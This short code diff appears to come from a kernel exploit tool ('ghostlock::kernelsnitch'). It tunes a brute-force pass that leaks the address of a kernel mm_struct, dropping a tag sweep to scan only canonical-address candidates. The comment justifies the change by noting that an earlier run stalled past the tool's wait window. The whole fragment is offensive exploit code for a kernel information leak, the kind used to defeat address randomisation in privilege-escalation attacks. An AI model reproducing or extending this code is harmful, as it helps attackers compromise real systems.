@@ -714,10 +714,14 @@ namespace ghostlock::kernelsnitch {
             __run_mm_leak_pass(ks, 0, 1, 0);
         }
         if (!ks->found) {
-            /* v12.2: fine-grid last resort — 128-byte stride, every
-             * ≥128-aligned candidate; ~80s but closes the grid-gap class. */
+            /* v12.4: fine-grid last resort — 128-byte stride, canonical top
+             * byte ONLY. With the tag sweep this pass costs ~20 minutes
+             * (1.6B candidates × 15 tags), which wedged the 11:59 run past
+             * the kernelsnitch wait window; canonical-only is ~80s and
+             * covers every 0xf-canonical mm (the overwhelmingly common
+             * case). */
             ks->mm_progress = 0;
-            __run_mm_leak_pass(ks, 1, 1, 1);
+            __run_mm_leak_pass(ks, 1, 0, 1);
         }
         ks->state = (ks->mm_struct == static_cast<size_t>(-1)) ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
         if (ks->state == KERNELSNITCH_MM_NOT_FOUND) {
